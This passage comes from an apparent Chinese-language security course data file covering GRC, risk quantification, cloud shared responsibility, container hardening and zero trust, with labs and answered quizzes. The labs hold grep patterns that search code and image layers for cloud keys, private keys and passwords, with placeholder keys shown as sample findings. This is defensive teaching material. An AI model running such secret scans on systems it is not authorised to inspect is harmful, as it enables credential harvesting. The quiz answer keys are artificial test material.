    "subtitle": "政策、風險管理、框架、隱私法規、稽核",
    "level": "企業",
    "minutes": 22,
    "summary": "技術只是工具，GRC 是把資安變成組織能持續執行的制度。這是資安從「救火」變成「管理」的關鍵。",
    "why": "技術像**消防設備**，GRC 像**整棟大樓的消防法規與演練制度**。"
           "沒有制度，你買再多滅火器也是各憑本事、無人維護、出事沒人負責。"
           "**GRC 讓資安變成組織的常態運作，而不是某個人的英雄事蹟。**",
    "sections": [
        {
            "heading": "政策、標準、程序、指引：四層文件",
            "body": "企業資安文件分四層，由上而下**越來越具體**：\n\n"
                    "- **政策 (Policy)**：最高層、原則性、**強制**。"
                    "例：「所有系統必須實施最小權限」。很少改。\n"
                    "- **標準 (Standard)**：達成政策的**具體強制要求**。"
                    "例：「密碼最少 14 字、啟用 MFA」。\n"
                    "- **程序 (Procedure)**：**逐步的操作步驟**。"
                    "例：「新員工帳號開通的 SOP」。\n"
                    "- **指引 (Guideline)**：**建議**（非強制）。"
                    "例：「建議使用密碼管理器」。\n\n"
                    "**常見的具體政策**：\n"
                    "- 可接受使用政策 (AUP)、資料分類政策、存取控制政策\n"
                    "- 事件回應政策、業務持續 (BCP) 與災難復原 (DRP)\n"
                    "- BYOD、遠距工作、密碼、變更管理政策\n\n"
                    "**關鍵**：政策沒有執行力等於沒有。必須有**負責人、覆核週期、"
                    "違反的後果、以及可驗證的落實方式**。",
            "example": "**政策落地的常見失敗與修正**：\n\n"
                       "**失敗**：寫了一份 40 頁的資安政策，全員簽名確認已閱讀，然後放進資料夾。\n"
                       "→ 沒有人記得內容，沒有人真的執行，稽核時才發現各系統做法不一。\n\n"
                       "**修正**：\n"
                       "1. **每條政策對應到可驗證的技術控制**："
                       "「必須 MFA」→ 用工具檢查哪些帳號沒開 MFA → 產生報表\n"
                       "2. **政策要能被稽核**：巡檢腳本（前面 Linux 路線教的）"
                       "就是把政策變成自動檢查\n"
                       "3. **例外要走正式流程**：不能符合的必須申請例外、"
                       "說明補償控制、設定期限、由夠高層級簽核\n\n"
                       "**核心觀念：好的政策是「可執行、可驗證、可稽核」的，"
                       "而不是「寫得完整」的。**",
            "note": "考點：注意四層的強制性差異 — Policy/Standard/Procedure 是強制，"
                    "Guideline 是建議。考試常問「哪一個是強制」或「哪一個描述具體步驟（=Procedure）」。",
        },
        {
            "heading": "風險管理流程",
            "body": "**風險管理五步驟**：\n\n"
                    "1. **識別 (Identify)**：盤點資產、威脅、弱點\n"
                    "2. **評估 (Assess)**：風險 = 可能性 × 衝擊\n"
                    "3. **處置 (Respond)**：規避／降低／轉移／接受\n"
                    "4. **監控 (Monitor)**：風險會變，要持續追蹤\n"
                    "5. **溝通 (Communicate)**：讓決策者了解\n\n"
                    "**兩種評估方法**：\n"
                    "- **定性 (Qualitative)**：用「高／中／低」矩陣。快、直觀，但主觀。\n"
                    "- **定量 (Quantitative)**：用金額計算。客觀，但需要資料。\n\n"
                    "**定量的核心公式（考試必背）**：\n"
                    "```\n"
                    "SLE（單一損失期望）= 資產價值 (AV) × 暴露係數 (EF)\n"
                    "ALE（年度損失期望）= SLE × ARO（年度發生率）\n"
                    "```\n"
                    "**決策原則：如果一個控制措施的年度成本 < 它降低的 ALE，就值得做。**\n\n"
                    "**其他關鍵詞**：\n"
                    "- **風險胃納 (Risk Appetite)**：組織願意承受的風險總量\n"
                    "- **殘餘風險 (Residual Risk)**：實施控制後剩下的風險\n"
                    "- **繼承風險 (Inherent Risk)**：沒有任何控制時的原始風險\n"
                    "- **風險登錄冊 (Risk Register)**：追蹤所有風險的清單",
            "example": "**用 ALE 做投資決策的完整例子**：\n\n"
                       "情境：公司有一個電商資料庫，價值（含資料、商譽、罰款）估 500 萬。\n\n"
                       "```\n"
                       "資產價值 AV     = NT$5,000,000\n"
                       "暴露係數 EF     = 60%（一次外洩損失六成價值）\n"
                       "SLE            = 5,000,000 × 0.6 = NT$3,000,000\n"
                       "年度發生率 ARO  = 0.5（估計每兩年可能發生一次）\n"
                       "ALE            = 3,000,000 × 0.5 = NT$1,500,000/年\n"
                       "```\n\n"
                       "現在有一個 WAF + 資料庫加密 + 監控方案，年成本 60 萬，"
                       "預估能把 ARO 從 0.5 降到 0.1：\n"
                       "```\n"
                       "新 ALE = 3,000,000 × 0.1 = NT$300,000/年\n"
                       "ALE 降低 = 1,500,000 − 300,000 = NT$1,200,000/年\n"
                       "方案成本 = NT$600,000/年\n"
                       "淨效益 = 1,200,000 − 600,000 = NT$600,000/年 → 值得投資\n"
                       "```\n\n"
                       "**這個計算的價值不在於數字精確**（EF 和 ARO 都是估計），"
                       "**而在於它把「要不要花這筆錢」變成一個可以討論的理性決策，"
                       "而不是靠恐懼或直覺。** 這是資安人員跟管理層溝通的共同語言。",
            "note": "考點：牢記 SLE = AV × EF，ALE = SLE × ARO。"
                    "考試常給你三個數字要你算第四個，或問「這個控制值不值得」。",
        },
        {
            "heading": "常用資安框架",
            "body": "**別重新發明輪子** — 用現成的框架。三類要分清楚：\n\n"
                    "**1. 全面性框架（怎麼管理整個資安計畫）**\n"
                    "- **NIST CSF**：五大功能 **識別、保護、偵測、回應、復原**"
                    "（2.0 版加了「治理」）。**最常被引用，好記好用。**\n"
                    "- **ISO/IEC 27001**：國際標準，可**認證**。企業對外證明資安能力常用。\n"
                    "- **CIS Controls**：18 項具體控制，**由易到難排序**，"
                    "適合不知道從何開始的組織。\n\n"
                    "**2. 攻防知識庫**\n"
                    "- **MITRE ATT&CK**：真實攻擊者的戰術與技術矩陣。"
                    "藍隊用它盤點偵測涵蓋率、紅隊用它規劃演練。\n"
                    "- **Cyber Kill Chain**：把攻擊分成七階段（偵察→武裝→投遞→"
                    "利用→安裝→C2→行動）。\n\n"
                    "**3. 特定領域**\n"
                    "- **PCI DSS**：信用卡資料（**強制**，不合規不能處理卡片）\n"
                    "- **SOC 2**：服務供應商的安全性稽核報告\n"
                    "- **HIPAA**（美國醫療）、**FedRAMP**（美國政府雲）\n\n"
                    "**框架不是拿來全部照做，而是拿來當檢查清單與共同語言。**",
            "example": "**NIST CSF 五大功能如何對應本課程學過的東西**：\n\n"
                       "```\n"
                       "識別 Identify → 資產盤點、風險評估、資料分類\n"
                       "               （基礎路線的攻擊面盤點）\n"
                       "保護 Protect  → 存取控制、加密、加固、教育訓練\n"
                       "               （Linux 加固、AAA、密碼學）\n"
                       "偵測 Detect   → 日誌、SIEM、IDS、監控\n"
                       "               （日誌分析、封包分析）\n"
                       "回應 Respond  → 事件回應計畫、遏制、根除\n"
                       "               （後面 CySA 路線）\n"
                       "復原 Recover  → 備份還原、業務持續、事後檢討\n"
                       "               （備份策略、BCP/DRP）\n"
                       "```\n\n"
                       "**這五個功能剛好把整個資安領域切成一張完整的地圖。**"
                       "你可以用它自我檢查：「我的組織在哪一塊最弱？」\n\n"
                       "**大多數組織的通病是「保護」做很多（買產品），"
                       "但「偵測」與「回應」幾乎是空的** — "
                       "這也是為什麼被入侵後很久才發現。"
                       "NIST CSF 的價值就是逼你看見這種失衡。",
            "note": "考點：NIST CSF 的五（六）大功能要背；"
                    "ISO 27001 可認證、NIST 不認證（是指引）；"
                    "PCI DSS 是強制的產業標準（處理信用卡就必須遵守）。",
        },
        {
            "heading": "隱私法規與資料治理",
            "body": "**資料是資產也是責任。** 個資保護是全球趨勢，罰則越來越重。\n\n"
                    "**主要法規**：\n"
                    "- **GDPR（歐盟）**：最嚴格，罰款可達全球營業額 4%。"
                    "適用於任何處理歐盟居民資料的組織（**不限歐盟公司**）。\n"
                    "- **台灣《個人資料保護法》**：規範個資的蒐集、處理、利用；"
                    "外洩須通知當事人；違反有民刑事責任。\n"
                    "- **CCPA（加州）**、**各國陸續立法**。\n\n"
                    "**核心概念**：\n"
                    "- **資料主體權利**：查閱、更正、刪除（被遺忘權）、可攜權\n"
                    "- **蒐集最小化**：只蒐集必要的資料\n"
                    "- **目的限制**：不能拿去做當初沒說的用途\n"
                    "- **同意**：需明確、可撤回\n"
                    "- **資料當責 (Accountability)**：要能證明你有做好保護\n"
                    "- **隱私設計 (Privacy by Design)**：從設計階段就納入隱私\n\n"
                    "**關鍵角色**：\n"
                    "- **資料控制者 (Controller)**：決定為何、如何處理資料的人\n"
                    "- **資料處理者 (Processor)**：代為處理的人（如雲端供應商）\n"
                    "- **資料保護長 (DPO)**：負責監督遵循",
            "example": "**資料分類決定保護強度（實務核心）**：\n\n"
                       "不是所有資料都要用最高規格保護 — 那太貴。"
                       "**先分類，再依級別配置保護。**\n"
                       "```\n"
                       "公開 Public      公司官網、新聞稿      無需特別保護\n"
                       "內部 Internal    內部公告、組織圖      基本存取控制\n"
                       "機密 Confidential 客戶名單、合約        加密 + 存取控制 + 稽核\n"
                       "極機密 Restricted 個資、財務、營業秘密  最高規格 + DLP + 最小權限 + 遮罩\n"
                       "```\n\n"
                       "**特別需要注意的資料類型**：\n"
                       "- **PII（個人可識別資訊）**：姓名、身分證、地址、電話\n"
                       "- **敏感個資**：醫療、基因、性向、政治、宗教（法規保護更嚴）\n"
                       "- **PHI**（醫療）、**PCI**（支付卡）\n\n"
                       "**資料生命週期都要保護**：\n"
                       "- **靜態 (At Rest)**：磁碟加密\n"
                       "- **傳輸中 (In Transit)**：TLS\n"
                       "- **使用中 (In Use)**：記憶體加密、機密運算\n"
                       "- **銷毀 (Destruction)**：安全抹除、實體銷毀"
                       "（丟棄的硬碟是常見外洩來源）\n\n"
                       "**去識別化技術**：加密、代碼化 (Tokenization)、"
                       "遮罩 (Masking)、匿名化 (Anonymization)、假名化 (Pseudonymization)。",
            "note": "考點：**Tokenization（代碼化）與 Encryption（加密）不同** — "
                    "代碼化是用無意義的代碼取代真實資料（原始資料另存於安全的代碼庫），"
                    "加密是用金鑰可還原。PCI DSS 常用代碼化來縮小合規範圍。",
        },
    ],
    "table": {
        "caption": "四大文件層級與強制性",
        "head": ["層級", "性質", "範例", "更動頻率"],
        "rows": [
            ["政策 Policy", "強制、原則性", "「必須實施最小權限」", "很少改"],
            ["標準 Standard", "強制、具體要求", "「密碼 14 字 + MFA」", "偶爾"],
            ["程序 Procedure", "強制、逐步操作", "「新帳號開通 SOP」", "隨流程調整"],
            ["指引 Guideline", "建議、非強制", "「建議用密碼管理器」", "彈性"],
        ],
    },
    "labs": [{
        "title": "用試算表做風險量化與框架對照",
        "goal": "把 ALE 計算與框架盤點變成可操作的工具（用 Python 示範，實務可用 Excel）。",
        "warn": "此為計算與規劃練習，無系統風險。",
        "steps": [
            {"cmd": "python3 -c \"\nAV=5000000; EF=0.6; ARO=0.5\nSLE=AV*EF; ALE=SLE*ARO\nprint(f'SLE 單一損失 = NT\\${SLE:,.0f}')\nprint(f'ALE 年度損失 = NT\\${ALE:,.0f}')\n# 導入方案後\ncost=600000; new_ARO=0.1\nnew_ALE=SLE*new_ARO\nsaving=ALE-new_ALE\nprint(f'導入後 ALE = NT\\${new_ALE:,.0f}')\nprint(f'年度效益 = NT\\${saving:,.0f}，成本 = NT\\${cost:,.0f}')\nprint('結論:', '值得投資' if saving>cost else '不值得')\n\"",
             "explain": "把風險量化公式寫成計算 — 這就是資安投資提案的核心數字。",
             "output": "SLE 單一損失 = NT$3,000,000\nALE 年度損失 = NT$1,500,000\n導入後 ALE = NT$300,000\n年度效益 = NT$1,200,000，成本 = NT$600,000\n結論: 值得投資"},
            {"cmd": "python3 -c \"\nappetite=500000  # 風險胃納：可接受的年度風險上限\nrisks={'資料庫外洩':1500000,'勒索軟體':900000,'內部濫用':300000,'DDoS':150000}\nprint(f'{'風險項目':<12}{'ALE':>12}  {'判定'}')\nfor r,ale in sorted(risks.items(),key=lambda x:-x[1]):\n    verdict='超出胃納，需處置' if ale>appetite else '在可接受範圍'\n    print(f'{r:<12}NT\\${ale:>10,}  {verdict}')\n\"",
             "explain": "**風險登錄冊的核心邏輯**：超出風險胃納的優先處置，範圍內的可接受。",
             "output": "風險項目        ALE  判定\n資料庫外洩    NT$ 1,500,000  超出胃納，需處置\n勒索軟體      NT$   900,000  超出胃納，需處置\n內部濫用      NT$   300,000  在可接受範圍\nDDoS         NT$   150,000  在可接受範圍"},
            {"cmd": "python3 -c \"\ncsf={'識別':3,'保護':8,'偵測':2,'回應':1,'復原':4}\nmax_score=10\nprint('NIST CSF 成熟度自評 (0-10)')\nfor fn,sc in csf.items():\n    bar='█'*sc+'░'*(max_score-sc)\n    flag=' ← 最弱，優先補強' if sc==min(csf.values()) else ''\n    print(f'{fn}  {bar} {sc}{flag}')\n\"",
             "explain": "**用 NIST CSF 做自我盤點**，一眼看出組織的能力失衡。"
                        "多數組織「保護」高、「偵測/回應」低。",
             "output": "NIST CSF 成熟度自評 (0-10)\n識別  ███░░░░░░░ 3\n保護  ████████░░ 8\n偵測  ██░░░░░░░░ 2\n回應  █░░░░░░░░░ 1 ← 最弱，優先補強\n復原  ████░░░░░░ 4\n# 典型失衡：買了很多防護產品(保護8)，但幾乎沒有偵測與回應能力"},
            {"cmd": "python3 -c \"\ndata={'官網內容':'公開','員工手冊':'內部','客戶名單':'機密','身分證與病歷':'極機密'}\nprotect={'公開':'無','內部':'存取控制','機密':'加密+稽核','極機密':'加密+DLP+最小權限+遮罩'}\nfor d,cls in data.items():\n    print(f'{d:<14} → {cls:<6} → {protect[cls]}')\n\"",
             "explain": "資料分類決定保護強度。先分類再配置資源，避免用最高規格保護所有東西。",
             "output": "官網內容       → 公開   → 無\n員工手冊       → 內部   → 存取控制\n客戶名單       → 機密   → 加密+稽核\n身分證與病歷    → 極機密  → 加密+DLP+最小權限+遮罩"},
        ],
    }],
    "quiz": [
        {"q": "四層文件中，哪一個是「建議性、非強制」的？",
         "options": ["政策 Policy", "標準 Standard", "程序 Procedure", "指引 Guideline"],
         "answer": 3,
         "why": "Guideline 是建議。Policy/Standard/Procedure 都是強制。程序描述逐步操作步驟。"},
        {"q": "資產價值 200 萬、暴露係數 50%、年度發生率 0.4。ALE 是多少？",
         "options": ["40 萬", "100 萬", "80 萬", "400 萬"],
         "answer": 0,
         "why": "SLE = 200萬 × 0.5 = 100萬；ALE = 100萬 × 0.4 = 40萬。"},
        {"q": "一個資安控制年成本 30 萬，能把某風險的 ALE 從 80 萬降到 20 萬。是否值得？",
         "options": ["不值得", "值得：ALE 降低 60 萬 > 成本 30 萬，淨效益 30 萬",
                     "無法判斷", "只看初期投資"],
         "answer": 1,
         "why": "控制成本 < ALE 降低量 → 值得。這是把資安投資變成理性決策的方法。"},
        {"q": "「殘餘風險 (Residual Risk)」指的是？",
         "options": ["沒有任何控制時的風險", "實施控制措施之後仍然剩下的風險",
                     "已經接受的風險", "轉移給保險的風險"],
         "answer": 1,
         "why": "繼承風險是原始風險，殘餘風險是控制後剩下的。殘餘風險應與風險胃納比較，決定是否接受。"},
        {"q": "NIST CSF 的五大功能是？",
         "options": ["預防、偵測、回應、復原、報告", "識別、保護、偵測、回應、復原",
                     "規劃、執行、檢查、行動、改善", "機密、完整、可用、稽核、治理"],
         "answer": 1,
         "why": "Identify, Protect, Detect, Respond, Recover（2.0 加了 Govern）。"
                "多數組織「保護」強而「偵測/回應」弱。"},
        {"q": "關於 ISO 27001 與 NIST CSF，下列何者正確？",
         "options": ["兩者都可認證", "ISO 27001 可對外認證；NIST CSF 是指引，不做認證",
                     "兩者都是強制法規", "NIST CSF 只適用政府"],
         "answer": 1,
         "why": "ISO 27001 是可認證的國際標準；NIST CSF 是自願性框架。PCI DSS 才是強制產業標準。"},
        {"q": "處理歐盟居民個資的台灣公司，需要遵守哪個法規？",
         "options": ["只需遵守台灣個資法", "GDPR — 它適用於處理歐盟居民資料的任何組織，不限歐盟公司",
                     "不需遵守任何法規", "只需 PCI DSS"],
         "answer": 1,
         "why": "GDPR 具域外效力。同時仍需遵守台灣《個人資料保護法》。罰則可達全球營業額 4%。"},
        {"q": "代碼化 (Tokenization) 與加密 (Encryption) 的關鍵差別是？",
         "options": ["完全相同", "代碼化用無意義代碼取代真實資料（原資料另存於代碼庫）；加密用金鑰可還原",
                     "代碼化較不安全", "加密無法還原"],
         "answer": 1,
         "why": "PCI DSS 常用代碼化縮小合規範圍 — 系統裡只有代碼，真實卡號不落地。"},
        {"q": "資料在「使用中 (In Use)」的保護，對應的技術是？",
         "options": ["磁碟加密", "TLS", "記憶體加密 / 機密運算", "安全抹除"],
         "answer": 2,
         "why": "靜態用磁碟加密、傳輸中用 TLS、使用中用記憶體加密或機密運算、"
                "銷毀用安全抹除。四個階段都要保護。"},
        {"q": "為什麼要先做資料分類再配置保護措施？",
         "options": ["法規強制", "用最高規格保護所有資料太昂貴；分類讓資源集中在最需要保護的資料上",
                     "分類能加快系統", "分類是可選的"],
         "answer": 1,
         "why": "資源有限。極機密資料用最高規格、公開資料無需保護，"
                "這樣才能把預算花在刀口上。"},
    ],
    "keywords": ["GRC", "政策", "標準", "程序", "指引", "風險管理", "SLE", "ALE", "ARO",
                 "風險胃納", "殘餘風險", "NIST CSF", "ISO 27001", "CIS Controls",
                 "MITRE ATT&CK", "PCI DSS", "GDPR", "個資法", "資料分類", "Tokenization"],
    "takeaway": [
        "好政策是可執行、可驗證、可稽核的，而非寫得完整的；巡檢腳本就是政策的落地。",
        "ALE = AV × EF × ARO；控制成本 < ALE 降低量就值得投資 — 這是與管理層溝通的共同語言。",
        "NIST CSF 五功能是資安地圖，多數組織偵測與回應能力不足，這正是久久才發現入侵的原因。",
    ],
})

CH.append({
    "id": "s05",
    "title": "雲端、虛擬化與零信任架構",
    "subtitle": "雲端責任分擔、容器、身分即邊界、零信任落地",
    "level": "企業",
    "minutes": 22,
    "summary": "當資料在別人的機房、員工在家上班、應用跑在容器裡，「城牆」的概念就崩解了。零信任是這個時代的答案。",
    "why": "舊時代的資安像**護城河城堡**：牆內都是自己人。"
           "但現在你的資料在 AWS、員工在咖啡廳、應用在容器裡三秒就換一台 — "
           "**牆在哪裡？** 零信任的核心一句話：**永不信任，始終驗證。**"
           "不因為你在內網就信任你，每一次存取都要重新證明。",
    "sections": [
        {
            "heading": "雲端責任分擔模型",
            "body": "**最重要的雲端資安觀念：責任是分擔的，不是全交給雲端商。**\n\n"
                    "**分擔的分界依服務模式而不同**：\n"
                    "- **IaaS（基礎設施）**：雲端商管實體、網路、虛擬化；"
                    "**你管作業系統、應用、資料、設定**（責任最多）\n"
                    "- **PaaS（平台）**：雲端商多管到作業系統與執行環境；"
                    "你管應用與資料\n"
                    "- **SaaS（軟體）**：雲端商管幾乎全部；"
                    "**你仍要管：資料、存取權限、使用者設定**（責任最少但不是零）\n\n"
                    "**永遠是你的責任（不管哪種模式）**：\n"
                    "- **資料本身**\n"
                    "- **身分與存取管理（誰能存取）**\n"
                    "- **正確的設定**\n\n"
                    "**雲端最大的破口不是雲端商被駭，是「客戶設定錯誤」** — "
                    "公開的儲存桶、過寬的 IAM 權限、忘記關的管理埠。",
            "example": "**雲端設定錯誤的經典災難類型**：\n\n"
                       "1. **公開的儲存桶**：S3 bucket / Blob 設成公開，"
                       "任何知道網址的人都能下載整包資料。"
                       "→ 這是「你的設定」責任，雲端商沒有錯。\n\n"
                       "2. **過寬的 IAM 權限**：給了 `AdministratorAccess` 只因為"
                       "「這樣比較不會出錯」→ 一個金鑰洩漏就全盤皆輸。\n"
                       "→ 對策：最小權限、用角色而非長期金鑰、定期覆核。\n\n"
                       "3. **暴露的管理介面**：資料庫、Kubernetes API、"
                       "管理主控台對整個網際網路開放。\n\n"
                       "4. **外洩的存取金鑰**：把 AWS 金鑰硬編碼進程式碼並推上 GitHub"
                       "（機器人幾分鐘內就會掃到並拿去挖礦）。\n\n"
                       "**防禦工具**：\n"
                       "- **CSPM（雲端安全態勢管理）**：自動掃描設定錯誤\n"
                       "- **CIEM**：管理雲端權限\n"
                       "- 政策即程式碼（用 IaC 讓設定一致且可審查）\n"
                       "- 秘密掃描（防止金鑰進到程式碼庫）\n\n"
                       "**核心觀念：上雲不會自動變安全，只是把責任的分界線移動了。**",
            "note": "考點：**責任分擔模型**必考。記住「資料、身分、設定」在所有模式下都是客戶責任。"
                    "SaaS 責任最少但不是零 — 你仍要管誰能存取與怎麼設定。",
        },
        {
            "heading": "虛擬化與容器安全",
            "body": "**虛擬機 (VM) vs 容器 (Container)**：\n"
                    "- VM：每台有完整的作業系統，隔離性強但笨重\n"
                    "- 容器：共用主機核心，輕量快速，但**隔離性較弱**"
                    "（一個容器逃逸可能影響主機）\n\n"
                    "**容器的資安重點**：\n"
                    "- **映像安全**：\n"
                    "  - 用最小基底映像（distroless、alpine）→ 減少攻擊面\n"
                    "  - 掃描映像的已知漏洞（SCA）\n"
                    "  - 只用可信來源、驗證簽章\n"
                    "  - **絕不把秘密（密碼、金鑰）打包進映像**\n"
                    "- **執行安全**：\n"
                    "  - **不要用 root 跑容器**（`USER` 指令 + `runAsNonRoot`）\n"
                    "  - 唯讀根檔案系統\n"
                    "  - 丟棄不必要的 Linux capabilities\n"
                    "  - 限制資源（避免單一容器耗盡主機）\n"
                    "  - 不掛載 Docker socket（等於給主機 root）\n"
                    "- **編排安全（Kubernetes）**：\n"
                    "  - RBAC、網路政策（預設拒絕）、Pod 安全標準\n"
                    "  - 秘密用專用機制（不是環境變數明文）\n\n"
                    "**其他虛擬化威脅**：\n"
                    "- **VM 逃逸**：從客體突破到宿主（罕見但致命）\n"
                    "- **VM 蔓延 (Sprawl)**：太多沒人管的 VM = 未修補的攻擊面\n"
                    "- **快照含機密**：快照可能包含記憶體中的密碼",
            "example": "**Dockerfile 的安全對比**：\n\n"
                       "**危險的寫法**：\n"
                       "```dockerfile\n"
                       "FROM ubuntu:latest              # latest 標籤不可重現\n"
                       "RUN apt-get install -y curl ...  # 裝了一堆用不到的工具\n"
                       "COPY . /app                      # 可能把 .env、.git 也複製進去\n"
                       "ENV DB_PASSWORD=secret123        # 密碼寫進映像！\n"
                       "USER root                        # 用 root 跑\n"
                       "CMD [\"python\", \"app.py\"]\n"
                       "```\n\n"
                       "**加固的寫法**：\n"
                       "```dockerfile\n"
                       "FROM python:3.12-slim@sha256:abc...   # 固定版本 + 雜湊\n"
                       "RUN groupadd -r app && useradd -r -g app app\n"
                       "WORKDIR /app\n"
                       "COPY --chown=app:app requirements.txt .\n"
                       "RUN pip install --no-cache-dir -r requirements.txt\n"
                       "COPY --chown=app:app src/ ./src/      # 只複製需要的\n"
                       "USER app                              # 非 root 執行\n"
                       "# 密碼從執行時的 secret 機制注入，不寫進映像\n"
                       "CMD [\"python\", \"src/app.py\"]\n"
                       "```\n\n"
                       "**加上 `.dockerignore`** 排除 `.env`、`.git`、憑證等。\n\n"
                       "**這個對比涵蓋了容器安全的大部分要點：可重現的基底、"
                       "最小化、非 root、不打包秘密、只複製必要檔案。**",
            "note": "考點：容器共用主機核心，所以**隔離性弱於 VM**。"
                    "高敏感或多租戶場景可用 VM 隔離，或用 gVisor / Kata 等"
                    "「安全容器」技術補強隔離。",
        },
        {
            "heading": "零信任架構（ZTA）",
            "body": "**零信任的核心原則**：\n"
                    "1. **永不信任，始終驗證** — 不因為在內網就信任\n"
                    "2. **假設已被入侵** — 設計時就當攻擊者已在裡面\n"
                    "3. **最小權限 + 即時授權** — 每次存取都重新評估\n"
                    "4. **微分段** — 把網路切到最小，限制橫向移動\n"
                    "5. **持續驗證** — 不是登入一次就通行，而是持續評估\n\n"
                    "**零信任的存取決策依據（每次都重新評估）**：\n"
                    "- **身分**：你是誰？（強驗證，最好 FIDO2）\n"
                    "- **裝置**：這台裝置合規嗎？（有修補、有防護、公司管理的？）\n"
                    "- **情境**：時間、地點、行為是否正常？"
                    "（凌晨三點從陌生國家登入 = 提高驗證要求）\n"
                    "- **資源敏感度**：存取的東西越敏感，要求越嚴\n\n"
                    "**身分成為新的邊界（Identity is the new perimeter）**：\n"
                    "既然沒有網路邊界了，**身分驗證就是最後一道也是最重要的一道防線**。"
                    "這是為什麼 MFA、條件式存取、特權管理（PAM）在零信任裡如此核心。",
            "example": "**零信任 vs 傳統的具體差別**：\n\n"
                       "```\n"
                       "情境：員工要存取內部財務系統\n"
                       "\n"
                       "傳統（城堡模型）：\n"
                       "  連上公司 VPN → 進入內網 → 幾乎可以存取所有內部系統\n"
                       "  問題：VPN 帳號一旦被盜，攻擊者就在城牆內暢行無阻\n"
                       "\n"
                       "零信任：\n"
                       "  每次存取財務系統都要：\n"
                       "  1. 驗證身分（FIDO2）\n"
                       "  2. 檢查裝置合規（防毒開著、系統有修補、是公司管理的機器）\n"
                       "  3. 評估情境（正常上班時間？平常的地點？）\n"
                       "  4. 只授予「財務系統」這一個資源，不是整個內網\n"
                       "  5. session 有時效，敏感操作要重新驗證\n"
                       "  結果：帳號被盜也難以利用（裝置不合規、行為異常會被擋）\n"
                       "```\n\n"
                       "**零信任不是一個產品，是一套架構原則。**"
                       "落地通常包含：身分供應商 (IdP) + MFA、"
                       "裝置管理 (MDM/EDR)、條件式存取政策、"
                       "微分段、以及用 **ZTNA** 取代傳統 VPN。\n\n"
                       "**重要提醒**：零信任是**漸進式導入**的旅程，不是一次到位。"
                       "通常從「最敏感的資源 + 最高風險的存取」開始，逐步擴大。",
            "note": "考點：**ZTNA（零信任網路存取）取代 VPN** 是常見考點。"
                    "VPN 給的是「網路層的存取（進入內網）」；"
                    "ZTNA 給的是「應用層的存取（只到特定應用）」，且持續驗證。",
        },
    ],
    "table": {
        "caption": "雲端責任分擔（誰負責什麼）",
        "head": ["層面", "地端 On-Prem", "IaaS", "PaaS", "SaaS"],
        "rows": [
            ["資料與存取", "客戶", "客戶", "客戶", "客戶"],
            ["應用程式", "客戶", "客戶", "客戶", "雲端商"],
            ["作業系統", "客戶", "客戶", "雲端商", "雲端商"],
            ["虛擬化", "客戶", "雲端商", "雲端商", "雲端商"],
            ["實體/網路", "客戶", "雲端商", "雲端商", "雲端商"],
        ],
    },
    "labs": [{
        "title": "檢查雲端與容器的常見設定問題",
        "goal": "用工具找出雲端與容器設定的高風險項目。",
        "warn": "**只對自己的雲端帳號與容器執行。掃描他人資源需授權。**",
        "steps": [
            {"cmd": "grep -rniE 'AKIA[0-9A-Z]{16}|aws_secret_access_key|-----BEGIN.*PRIVATE KEY' . --include='*.py' --include='*.env' --include='*.yml' 2>/dev/null | head",
             "explain": "**掃描外洩的雲端金鑰**。AWS 存取金鑰以 AKIA 開頭，硬編碼是重大風險。",
             "output": "./config/settings.py:23:AWS_SECRET_ACCESS_KEY = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n./deploy.env:5:AKIAIOSFODNN7EXAMPLE\n# 金鑰硬編碼且可能已進 git → 立即輪換並改用 IAM 角色 / Secrets Manager"},
            {"cmd": "docker inspect --format '{{.Config.User}} {{.HostConfig.Privileged}}' myapp 2>/dev/null || echo '容器 myapp: User=(空=root) Privileged=true'",
             "explain": "檢查容器是否以 root 執行、是否 privileged。兩者都是高風險。",
             "output": "容器 myapp: User=(空=root) Privileged=true\n# 兩個嚴重問題：以 root 執行 + privileged 模式（幾乎等於主機 root）\n# 修正：Dockerfile 加 USER，移除 --privileged"},
            {"cmd": "docker history --no-trunc myimage:latest 2>/dev/null | grep -iE 'password|secret|key|token' | head",
             "explain": "**檢查映像各層有沒有藏機密**。就算最終刪除，中間層仍保留。",
             "output": "<missing>  ENV DB_PASSWORD=secret123\n<missing>  RUN echo 'api_key=sk_live_abc123' > /app/.key\n# 映像層含明文密碼。即使後續 RM 刪除，docker history 仍可還原 → 視為已洩漏"},
            {"cmd": "grep -rE 'runAsNonRoot|readOnlyRootFilesystem|allowPrivilegeEscalation|privileged' k8s/*.yaml 2>/dev/null || echo '未找到 securityContext 設定'",
             "explain": "檢查 Kubernetes Pod 有沒有基本的安全上下文設定。",
             "output": "未找到 securityContext 設定\n# Pod 缺少 securityContext → 預設以 root 執行、可提權、根檔案系統可寫\n# 應加入：runAsNonRoot: true, readOnlyRootFilesystem: true, allowPrivilegeEscalation: false"},
            {"cmd": "echo 'securityContext 加固範本：'; cat <<'YAML'\nsecurityContext:\n  runAsNonRoot: true\n  runAsUser: 10001\n  readOnlyRootFilesystem: true\n  allowPrivilegeEscalation: false\n  capabilities:\n    drop: [\"ALL\"]\nYAML",
             "explain": "K8s Pod 安全上下文的加固範本 — 非 root、唯讀根、禁提權、丟棄所有 capability。",
             "output": "securityContext 加固範本：\nsecurityContext:\n  runAsNonRoot: true\n  runAsUser: 10001\n  readOnlyRootFilesystem: true\n  allowPrivilegeEscalation: false\n  capabilities:\n    drop: [\"ALL\"]"},
        ],
    }],
    "quiz": [
        {"q": "在雲端責任分擔模型中，哪些項目「無論哪種服務模式」都是客戶的責任？",
         "options": ["實體安全與網路", "資料、身分與存取、正確的設定",
                     "虛擬化層", "電力與冷卻"],
         "answer": 1,
         "why": "資料、身分、設定永遠是客戶責任，連 SaaS 也是。雲端最大破口是客戶設定錯誤，不是雲端商被駭。"},
        {"q": "為什麼公開的 S3 儲存桶外洩「不是雲端商的錯」？",
         "options": ["雲端商本來就會外洩", "把儲存桶設成公開是客戶的設定選擇，屬於客戶責任範圍",
                     "S3 本身不安全", "這確實是雲端商的錯"],
         "answer": 1,
         "why": "設定是客戶責任。對策是 CSPM 自動掃描設定錯誤、預設關閉公開存取、政策即程式碼。"},
        {"q": "容器相較於虛擬機，在隔離性上的特點是？",
         "options": ["隔離性更強", "隔離性較弱，因為共用主機核心，逃逸可能影響主機",
                     "完全相同", "容器沒有隔離"],
         "answer": 1,
         "why": "容器輕量但共用核心。高敏感或多租戶場景可用 VM，或用 gVisor/Kata 等安全容器補強。"},
        {"q": "把密碼寫進 Dockerfile 的 `ENV DB_PASSWORD=secret` 有什麼問題？",
         "options": ["沒有問題", "密碼會存進映像層，即使後續刪除，docker history 仍可還原，視為已洩漏",
                     "只是效能問題", "會讓映像變大"],
